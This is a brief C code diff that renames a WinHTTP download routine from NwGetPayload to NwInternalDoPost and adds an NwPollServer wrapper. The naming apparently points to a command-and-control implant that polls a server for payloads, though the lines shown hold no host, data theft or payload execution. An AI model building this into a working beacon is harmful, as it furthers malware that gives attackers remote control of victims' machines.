@@ -37,7 +37,7 @@ BOOL NwLoadApis() {
     return TRUE;
 }
 
-PVOID NwGetPayload(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize) {
+PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize) {
 	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
     DWORD Size = 0, Downloaded = 0, TotalSize = 0, bufferSize = 4096;
     BOOL bResults;
@@ -119,4 +119,12 @@ CLEANUP:
     }
 
     return outBuffer;
+}
+
+
+
+
+PVOID NwPollServer(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize) {
+    PVOID Addr = NwInternalDoPost(PayloadSize, PostBody, PostBodySize);
+    return Addr;
 }
